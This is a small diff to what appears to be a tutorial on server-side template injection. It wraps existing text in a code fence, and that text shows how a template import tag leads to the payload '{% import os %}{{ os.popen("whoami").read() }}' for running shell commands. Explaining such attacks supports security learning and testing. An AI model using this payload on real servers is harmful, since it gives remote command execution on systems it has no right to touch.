@@ -97,6 +97,7 @@ Elements of arrays can be accessed with:
 
 #### import
 
+```python
 {% import module %} – Allows you to import python modules.
 
 Example: {% import subprocess %}
@@ -104,3 +105,7 @@ Example: {% import subprocess %}
 That’s all we need to craft an exploit code.
 
 {% import os %}{{ os.popen("whoami").read() }}
+```
+
+
+
